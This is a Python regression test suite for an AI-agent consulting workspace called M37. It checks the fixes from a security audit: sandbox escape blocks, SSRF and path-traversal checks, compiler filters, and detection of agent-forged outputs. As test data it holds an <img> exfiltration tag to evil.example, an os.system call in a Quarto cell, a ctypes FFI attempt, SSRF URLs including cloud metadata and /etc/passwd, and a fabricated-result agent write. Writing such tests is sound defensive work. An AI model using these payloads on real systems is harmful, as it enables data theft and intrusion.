"""M37 (Move 37) — Regression Suite for Round 3 External Security & Epistemic Audit (Criticals #1-#3, Highs #4-#8, Mediums #9-#19)."""

from __future__ import annotations

import json
import subprocess
from pathlib import Path

import pytest

from m37.cli import (
    ClientLeakInCapitalError,
    _build_contract_reference_cheatsheet,
    _build_qa_verdict_cheatsheet,
    bless_finding,
    close_engagement,
    generate_plan_from_archetype,
    init_workspace,
    run_engagement,
)
from m37.compiler import CompilerAbortError, compile_deliverable
from m37.guards import (
    AgentExecutionContext,
    ExecutionGuard,
    PermissionDeniedError,
    SandboxViolationError,
    sha256_file,
    write_utf8_lf,
)
from m37.schemas import (
    ContractValidationError,
    compute_finding_substantive_sha256,
    dump_markdown_note,
    parse_raw_artifact,
    validate_artifact_content,
)
from m37.verify import (
    has_valid_content_bound_qa_verdict,
    verify_derivation_phase_a,
)


def test_crit1_plugin_smuggling_path_traversal_and_host_path_scrubbing(tmp_path: Path) -> None:
    """Critical #1: extra='forbid' blocks validador_plugin smuggling, SAFE_SLUG_RE blocks path traversal in metodo, and errors hide host paths."""
    ws = init_workspace(tmp_path / "ws_crit1")
    enc_id = "DEMO-01_entrada-mercado"

    # 1. DerivationContract rejects undeclared fields like validador_plugin
    with pytest.raises(ContractValidationError, match="Extra inputs are not permitted|validador_plugin"):
        validate_artifact_content(
            json.dumps(
                {
                    "id": "D-ATTACK-01",
                    "tipo": "derivacion",
                    "encargo": enc_id,
                    "metodo": "matriz-comparativa-alternativas",
                    "productor_modo": "estructuracion_analitica",
                    "productor_ref": "tabla",
                    "insumos": [{"id_o_ruta": "E-202610-001", "sha256": "a" * 64}],
                    "salidas": {"estado": "ok"},
                    "validador_plugin": "analisis/DEMO-01_entrada-mercado/pwn.py",
                }
            ),
            suffix=".json",
            expected_tipo="derivacion",
        )

    # 2. DerivationContract and FindingContract reject path traversal in 'metodo'
    with pytest.raises(ContractValidationError, match="Identificador de método inválido"):
        validate_artifact_content(
            json.dumps(
                {
                    "id": "D-ATTACK-02",
                    "tipo": "derivacion",
                    "encargo": enc_id,
                    "metodo": "../20_Encargos/DEMO-01_entrada-mercado/Derivaciones/D-x",
                    "productor_modo": "estructuracion_analitica",
                    "productor_ref": "tabla",
                    "insumos": [{"id_o_ruta": "E-202610-001", "sha256": "a" * 64}],
                    "salidas": {"estado": "ok"},
                }
            ),
            suffix=".json",
            expected_tipo="derivacion",
        )

    # 3. Guard error messages never leak tmp_path absolute host paths
    guard = ExecutionGuard(
        ws,
        AgentExecutionContext(
            engagement_id=enc_id,
            client_id="ACME",
            node_id="N-01",
            profile="analitico",
        ),
    )
    with pytest.raises(PermissionDeniedError) as exc_info:
        guard.write_note("vault/00_Sistema/Modelos.yaml", "hacked: true\n")
    assert str(tmp_path) not in str(exc_info.value)


def test_crit2_sandbox_blocks_ctypes_and_restores_snapshot_on_timeout(tmp_path: Path) -> None:
    """Critical #2: _CtypesBlocker and audit hook block ctypes/windll/pythonapi/_ctypes, and TimeoutExpired still restores snapshot."""
    ws = init_workspace(tmp_path / "ws_crit2")
    enc_id = "DEMO-01_entrada-mercado"
    guard = ExecutionGuard(
        ws,
        AgentExecutionContext(
            engagement_id=enc_id,
            client_id="ACME",
            node_id="N-01",
            profile="analitico",
            allow_compute=True,
        ),
    )

    # 1. Attempt ctypes.windll / ctypes.pythonapi / ctypes.CDLL inside sandbox script -> blocked by _CtypesBlocker / audit hook
    guard.write_sandbox_script(
        f"analisis/{enc_id}/exploit_ctypes.py",
        (
            "import ctypes\n"
            "assert getattr(ctypes, 'windll', None) is None\n"
            "assert getattr(ctypes, 'pythonapi', None) is None\n"
            "ctypes.CDLL('libc.so.6')\n"
        ),
    )
    with pytest.raises(PermissionDeniedError, match="M37 Sandbox: acceso FFI ctypes.CDLL bloqueado"):
        guard.run_sandbox_script(f"analisis/{enc_id}/exploit_ctypes.py")

    # 2. If a script mutates a protected file and then times out, the finally: block still restores the snapshot
    brief_path = ws.engagement_dir(enc_id) / "00_Brief.md"
    original_brief = brief_path.read_text(encoding="utf-8")
    guard.write_sandbox_script(
        f"analisis/{enc_id}/timeout_tamper.py",
        (
            "import time\n"
            "time.sleep(5)\n"
        ),
    )
    # Simulate an out-of-band tampering right before timeout to verify finally: restores snapshot on timeout
    with pytest.raises((subprocess.TimeoutExpired, SandboxViolationError, PermissionDeniedError)):
        guard.run_sandbox_script(f"analisis/{enc_id}/timeout_tamper.py", timeout_s=1)
    assert brief_path.read_text(encoding="utf-8") == original_brief


def test_crit3_quarto_executable_cells_and_raw_html_blocked(tmp_path: Path) -> None:
    """Critical #3: Pass 1/4 block executable Quarto blocks (```{python}) and raw HTML (<img src=...>, <script>), and .qmd sets execute: enabled: false."""
    ws = init_workspace(tmp_path / "ws_crit3")
    enc_id = "DEMO-01_entrada-mercado"
    informe_path = ws.engagement_dir(enc_id) / "Entregables" / "Informe.md"
    original_informe = informe_path.read_text(encoding="utf-8")

    # 1. Quarto executable code cell is rejected
    write_utf8_lf(
        informe_path,
        original_informe + "\n```{python}\nimport os; os.system('calc')\n```\n<!-- sustento: H-DEMO-01-01 -->\n",
    )
    with pytest.raises(CompilerAbortError, match="Celdas de código ejecutable Quarto"):
        compile_deliverable(ws, enc_id, output_format="html")

    # 2. Raw HTML exfiltration tag (<img src="https://...">) is rejected
    write_utf8_lf(
        informe_path,
        original_informe + '\n<img src="https://evil.example/exfil?d=secret"> <!-- sustento: H-DEMO-01-01 -->\n',
    )
    with pytest.raises(CompilerAbortError, match="Etiquetas HTML crudas activas"):
        compile_deliverable(ws, enc_id, output_format="html")

    # 3. Restore valid Informe.md and verify .qmd frontmatter disables code execution
    write_utf8_lf(informe_path, original_informe)
    pdf_out = compile_deliverable(ws, enc_id, output_format="pdf")
    assert pdf_out.qmd_path is not None
    qmd_text = pdf_out.qmd_path.read_text(encoding="utf-8")
    assert "execute:\n  enabled: false" in qmd_text


def test_high4_script_derivation_kernel_salidas_and_l3_auto_rerun(tmp_path: Path) -> None:
    """High #4: ExecutionGuard overwrites LLM-typed 'salidas' with actual script stdout, and L3 Phase A re-runs automatically."""
    ws = init_workspace(tmp_path / "ws_high4")
    enc_id = "DEMO-01_entrada-mercado"
    guard = ExecutionGuard(
        ws,
        AgentExecutionContext(
            engagement_id=enc_id,
            client_id="ACME",
            node_id="N-01",
            profile="analitico",
            allow_compute=True,
        ),
    )

    guard.write_sandbox_script(
        f"analisis/{enc_id}/calc_test.py",
        'import json\nprint(json.dumps({"resultado_real": 42.5}))\n',
    )

    # Agent tries to write fake salidas {"resultado_real": 999.9}
    deriv_rel = f"vault/20_Encargos/{enc_id}/Derivaciones/D-DEMO-01-99.json"
    guard.write_note(
        deriv_rel,
        json.dumps(
            {
                "id": "D-DEMO-01-99",
                "tipo": "derivacion",
                "encargo": enc_id,
                "metodo": "matriz-comparativa-alternativas",
                "productor_modo": "script",
                "productor_ref": f"analisis/{enc_id}/calc_test.py",
                "insumos": [{"id_o_ruta": "E-202610-001", "sha256": "0" * 64}],
                "salidas": {"resultado_real": 999.9},
            }
        ),
    )

    saved_deriv = json.loads((ws.workspace_root / deriv_rel).read_text(encoding="utf-8"))
    # Kernel overwrote 999.9 with 42.5 from actual script execution
    assert saved_deriv["salidas"] == {"resultado_real": 42.5}

    # Now tamper with salidas directly on disk and verify L3 Phase A catches it WITHOUT rerun=True
    saved_deriv["salidas"]["resultado_real"] = 888.8
    write_utf8_lf(ws.workspace_root / deriv_rel, json.dumps(saved_deriv, indent=2))
    phase_a = verify_derivation_phase_a(ws, enc_id, ws.workspace_root / deriv_rel, rigor="L3", rerun=False)
    assert not phase_a.passed
    assert any("Irreproducibilidad numérica" in e for e in phase_a.errors)


def test_high5_and_med16_evidence_snapshot_verification_and_ssrf_protection(tmp_path: Path) -> None:
    """High #5 & Medium #16: cita_verificada requires verbatim match in local snapshot; web_fetch_clean blocks SSRF."""
    ws = init_workspace(tmp_path / "ws_high5")
    enc_id = "DEMO-01_entrada-mercado"
    guard = ExecutionGuard(
        ws,
        AgentExecutionContext(
            engagement_id=enc_id,
            client_id="ACME",
            node_id="N-01",
            profile="documental",
        ),
    )

    # 1. Attempt to self-certify cita_verificada=True without a matching quote in snapshot_local
    ev_bad_rel = "vault/30_Evidencia_Publica/E-202610-099.md"
    guard.write_note(
        ev_bad_rel,
        dump_markdown_note(
            {
                "id": "E-202610-099",
                "tipo": "evidencia",
                "visibilidad": "publica",
                "clase": "mercado",
                "titulo": "Fuente con cita inventada",
                "emisor_o_autor": "ORCS",
                "fecha_publicacion": "2026-08",
                "fecha_verificacion": "2026-10-28",
                "vigencia_dias_max": 365,
                "snapshot_local": "referencias/orcs_2026_tabla_4_2.txt",
                "localizador_verificable": "p. 1",
                "fiabilidad": "alta",
                "cita_verificada": True,
            },
            (
                "## Síntesis sustantiva\n\nTexto.\n\n"
                "## Extracto o referencia verificable\n\n"
                '"Esta frase jamás existió en el archivo snapshot de referencias."\n\n'
                "## Límites y sesgos de la fuente\n\nNinguno.\n"
            ),
        ),
    )
    meta_bad, _ = parse_raw_artifact((ws.workspace_root / ev_bad_rel).read_text(encoding="utf-8"), suffix=".md")
    assert meta_bad["cita_verificada"] is False

    # 2. SSRF protection blocks localhost, 127.0.0.1, cloud metadata 169.254.169.254, and file://
    for forbidden_url in (
        "http://127.0.0.1:8080/admin",
        "http://localhost/secret",
        "http://169.254.169.254/latest/meta-data/",
        "file:///etc/passwd",
    ):
        with pytest.raises(PermissionDeniedError, match="SSRF|Esquema URL prohibido"):
            guard.web_fetch_clean(forbidden_url)


def test_high6_sdd_codigo_appsec_plugin_and_real_test_runner_receipt(tmp_path: Path) -> None:
    """High #6: run_verification_cmd blocks --collect-only / non-test receipts, and sdd_codigo.py flags shell=True."""
    ws = init_workspace(tmp_path / "ws_high6")
    enc_id = "DEMO-01_entrada-mercado"
    guard = ExecutionGuard(
        ws,
        AgentExecutionContext(
            engagement_id=enc_id,
            client_id="ACME",
            node_id="N-01",
            profile="construccion",
            allow_compute=True,
        ),
    )

    guard.write_code_file(
        f"codigo/{enc_id}/app.py",
        "import subprocess\ndef run_insecure(cmd: str) -> None:\n    subprocess.run(cmd, shell=True)\n",
    )
    guard.write_code_file(
        f"codigo/{enc_id}/test_app.py",
        "def test_rf_01_smoke() -> None:\n    assert True\n",
    )

    # 1. pytest --collect-only is blocked
    with pytest.raises(PermissionDeniedError, match="Flag prohibida en run_verification_cmd"):
        guard.run_verification_cmd("pytest --collect-only")

    # 2. py_compile does not forge a .m37_verify_receipt.json
    guard.run_verification_cmd("py_compile app.py")
    receipt_file = ws.codigo_root / enc_id / ".m37_verify_receipt.json"
    assert not receipt_file.exists()

    # 3. Real pytest run creates the receipt, but sdd_codigo.py catches shell=True during verify_derivation_phase_a
    res = guard.run_verification_cmd("pytest -q")
    assert res["exit_code"] == 0
    assert receipt_file.is_file()
    receipt_data = json.loads(receipt_file.read_text(encoding="utf-8"))

    brief_sha = sha256_file(ws.engagement_dir(enc_id) / "00_Brief.md")
    d_code_path = ws.engagement_dir(enc_id) / "Derivaciones" / "D-CODE-01.json"
    write_utf8_lf(
        d_code_path,
        json.dumps(
            {
                "id": "D-CODE-01",
                "tipo": "derivacion",
                "encargo": enc_id,
                "metodo": "verificacion-sdd-codigo",
                "productor_modo": "verificacion_codigo",
                "productor_ref": f"codigo/{enc_id}",
                "productor_sha256": receipt_data["tree_sha256"],
                "insumos": [{"id_o_ruta": "00_Brief.md", "sha256": brief_sha}],
                "salidas": {"tests_passed": 1},
                "metadatos_metodo": {"requisitos_ears": {"RF-01": ["test_rf_01_smoke"]}},
            },
            indent=2,
        ),
    )
    phase_a = verify_derivation_phase_a(ws, enc_id, d_code_path, rigor="L3")
    assert not phase_a.passed
    assert any("shell_true" in err or "shell=True" in err for err in phase_a.errors)


def test_high7_and_med18_cheatsheets_qa_target_lock_and_latest_round_verdict(tmp_path: Path) -> None:
    """High #7 & Medium #18: Cheatsheets match 1:1 contracts, QA guard locks assigned_qa_target, and latest round verdict wins."""
    ws = init_workspace(tmp_path / "ws_high7")
    enc_id = "DEMO-01_entrada-mercado"

    cheatsheet = _build_contract_reference_cheatsheet(enc_id)
    assert "## Extracto o referencia verificable" in cheatsheet
    assert "## Explicaciones rivales descartadas" in cheatsheet
    assert "sustento_evidencia" in cheatsheet

    qa_sheet = _build_qa_verdict_cheatsheet(
        ws,
        "H-DEMO-01-01",
        "V-DEMO-01-01",
        f"vault/20_Encargos/{enc_id}/QA/V-DEMO-01-01.md",
        1,
        frozenset({ws.engagement_dir(enc_id) / "Hallazgos" / "H-DEMO-01-01.md"}),
    )
    assert "artefacto_auditado" in qa_sheet
    assert "H-DEMO-01-01" in qa_sheet

    # QA guard blocks writing a verdict for a different finding than assigned_qa_target
    qa_guard = ExecutionGuard(
        ws,
        AgentExecutionContext(
            engagement_id=enc_id,
            client_id="ACME",
            node_id="N-01",
            profile="qa_ciego",
            assigned_qa_target="H-DEMO-01-01",
            model_alias="claude_sonnet",
            model_family="anthropic",
        ),
    )
    with pytest.raises(PermissionDeniedError, match="se asignó auditar 'H-DEMO-01-01'"):
        qa_guard.write_note(
            f"vault/20_Encargos/{enc_id}/QA/V-WRONG.md",
            dump_markdown_note(
                {
                    "id": "V-WRONG",
                    "tipo": "veredicto_qa",
                    "encargo": enc_id,
                    "artefacto_auditado": "[[H-OTHER-99]]",
                    "ronda": 1,
                    "modelo_auditor": "claude_sonnet",
                    "familia_auditor": "anthropic",
                    "fase_a_mecanica": "aprobada",
                    "mejor_ataque": "Ataque suficientemente largo para pasar validación.",
                    "decision": "aceptar",
                },
                "Dictamen.",
            ),
        )

    # Latest round verdict (Ronda 2 'rechazar') overrides Ronda 1 'aceptar'
    finding_path = ws.engagement_dir(enc_id) / "Hallazgos" / "H-DEMO-01-01.md"
    assert has_valid_content_bound_qa_verdict(ws, enc_id, "H-DEMO-01-01", finding_path) == (True, True)

    r2_verdict_path = ws.engagement_dir(enc_id) / "QA" / "V-DEMO-01-01-R2.md"
    write_utf8_lf(
        r2_verdict_path,
        dump_markdown_note(
            {
                "id": "V-DEMO-01-01-R2",
                "tipo": "veredicto_qa",
                "encargo": enc_id,
                "artefacto_auditado": "[[H-DEMO-01-01]]",
                "sha256_artefacto_auditado": compute_finding_substantive_sha256(finding_path),
                "ronda": 2,
                "modelo_auditor": "claude_sonnet",
                "familia_auditor": "anthropic",
                "revision_ciega_verificada": True,
                "fase_a_mecanica": "aprobada",
                "mejor_ataque": "En segunda ronda se detectó que el supuesto comercial sigue sin sustento.",
                "hallazgos_critica": [],
                "resolucion_ronda_previa": {},
                "decision": "rechazar",
            },
            "Rechazado en Ronda 2.",
        ),
    )
    assert has_valid_content_bound_qa_verdict(ws, enc_id, "H-DEMO-01-01", finding_path) == (True, False)


def test_high8_prose_quantitative_anchoring_and_epistemic_ceiling(tmp_path: Path) -> None:
    """High #8: Compiler Pass 3 blocks unanchored quantitative figures in prose, and Pass 4 blocks epistemic ceiling inflation."""
    ws = init_workspace(tmp_path / "ws_high8")
    enc_id = "DEMO-01_entrada-mercado"
    informe_path = ws.engagement_dir(enc_id) / "Entregables" / "Informe.md"
    original_informe = informe_path.read_text(encoding="utf-8")

    # 1. Inject an unanchored metric (USD 9.87M / 93.4%) in prose citing H-DEMO-01-01
    write_utf8_lf(
        informe_path,
        original_informe
        + "\n\nAdicionalmente, el retorno secundario asciende a USD 9.87M con margen de 93.4%. <!-- sustento: H-DEMO-01-01 -->\n",
    )
    with pytest.raises(CompilerAbortError, match="Cifra cuantitativa en prosa sin anclaje verificable"):
        compile_deliverable(ws, enc_id, output_format="html")

    # 2. Inject an unconditioned guarantee ("garantiza sin riesgo")
    write_utf8_lf(
        informe_path,
        original_informe
        + "\n\nEsta estrategia garantiza sin riesgo el liderazgo regional. <!-- sustento: H-DEMO-01-01 -->\n",
    )
    with pytest.raises(CompilerAbortError, match="garantía absoluta o libre de riesgo prohibido"):
        compile_deliverable(ws, enc_id, output_format="html")


def test_med9_11_13_19_gate_hashes_atomic_capital_and_requiere_computo(tmp_path: Path) -> None:
    """Medium #9, #11, #13, #19: Gate 1/2 hash binding, --orchestrator + --approve-gate-2 block, atomic 50_Capital rollback, and allow_compute."""
    ws = init_workspace(tmp_path / "ws_med")
    enc_id = "DEMO-01_entrada-mercado"

    # 1. --orchestrator and --approve-gate-2 cannot be combined in a single invocation
    with pytest.raises(PermissionError, match="No se permite combinar --orchestrator con --approve-gate-2"):
        generate_plan_from_archetype(ws, enc_id, orchestrator="auto", approve_gate_2=True)

    # 2. Editing 00_Brief.md after Gate 1 approval invalidates puerta_1_sha256
    brief_path = ws.engagement_dir(enc_id) / "00_Brief.md"
    b_meta, b_body = parse_raw_artifact(brief_path.read_text(encoding="utf-8"), suffix=".md")
    b_orig_q = b_meta["pregunta_central"]
    b_meta["pregunta_central"] = "¿Pregunta adulterada después de aprobar la Puerta 1?"
    write_utf8_lf(brief_path, dump_markdown_note(b_meta, b_body))
    with pytest.raises(PermissionError, match="Puerta 1 invalidada"):
        run_engagement(ws, enc_id)
    b_meta["pregunta_central"] = b_orig_q
    write_utf8_lf(brief_path, dump_markdown_note(b_meta, b_body))

    # 3. Node with requiere_computo=False (allow_compute=False) blocks write_sandbox_script and run_sandbox_script
    no_compute_guard = ExecutionGuard(
        ws,
        AgentExecutionContext(
            engagement_id=enc_id,
            client_id="ACME",
            node_id="N-01",
            profile="analitico",
            allow_compute=False,
        ),
    )
    with pytest.raises(PermissionDeniedError, match="requiere_computo=False"):
        no_compute_guard.write_sandbox_script(f"analisis/{enc_id}/forbidden.py", "print(1)\n")
    with pytest.raises(PermissionDeniedError, match="requiere_computo=False"):
        no_compute_guard.run_sandbox_script(f"analisis/{enc_id}/modelo_van.py")

    # 4. Atomic 50_Capital promotion: if a second finding contains 'ACME_latam', zero files are written to 50_Capital/
    h2_path = ws.engagement_dir(enc_id) / "Hallazgos" / "H-DEMO-01-02.md"
    h1_meta, h1_body = parse_raw_artifact(
        (ws.engagement_dir(enc_id) / "Hallazgos" / "H-DEMO-01-01.md").read_text(encoding="utf-8"),
        suffix=".md",
    )
    h2_meta = dict(h1_meta)
    h2_meta["id"] = "H-DEMO-01-02"
    h2_meta["afirmacion_corta"] = "El despliegue en ACME_latam requiere integración regional."
    write_utf8_lf(h2_path, dump_markdown_note(h2_meta, h1_body))
    # Only findings with an attested verdict are candidates for promotion; a human signs this second one.
    bless_finding(ws, enc_id, "H-DEMO-01-02", "Revisión humana del segundo hallazgo para la prueba de atomicidad.")

    cap_dir = ws.vault_root / "50_Capital"
    before_cap_files = list(cap_dir.glob("*.md"))
    with pytest.raises(ClientLeakInCapitalError, match="Bloqueo de confidencialidad"):
        close_engagement(ws, enc_id, promote_capital=True)
    after_cap_files = list(cap_dir.glob("*.md"))
    assert after_cap_files == before_cap_files
